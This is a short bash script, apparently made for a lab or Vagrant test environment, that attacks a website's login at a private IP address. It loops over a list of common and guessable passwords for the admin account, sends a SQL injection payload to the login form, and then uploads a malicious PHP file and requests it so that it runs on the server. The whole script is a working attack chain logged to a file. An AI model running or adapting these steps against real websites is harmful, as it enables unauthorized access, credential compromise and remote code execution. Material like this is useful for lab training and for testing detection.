#!/bin/bash

##############################################################
# SQL Injection on and simple bruteforce on login of website
# Ing. Alexander Poschenreithner, 2017
##############################################################

# Do first normal request
echo "     => Calling Website..."
curl 10.11.12.10

# Some automated tries with standard values
echo "     => Bruteforcing some standard passwords"
declare -a arr=("password" "password123" "123456" "admin" "abcd" "Scions Verlag" "ScionsVerlag" "scionsverlag2017" "administrator")
for password in "${arr[@]}"
do
	echo "       => $password"
    curl -X POST -F "username=admin" -F "password=$password" -F "login=Login" http://10.11.12.10/index.php >> /tmp/attack.log
done

# Now the SQL Injection
echo "     => SQL Injection"
curl -X POST -F "username=' OR 1 =1; --" -F "password=x" -F "login=Login" http://10.11.12.10/index.php >> /tmp/attack.log

# Try to upload bad php file and call it... 
echo "     => Now upload a bad PHP File and call it"
curl -v -F "submit=Upload Report" -F "file=@/vagrant_data/badPHP.php" http://10.11.12.10/report.php >> /tmp/attack.log
curl http://10.11.12.10/upload/badPHP.php >> /tmp/attack.log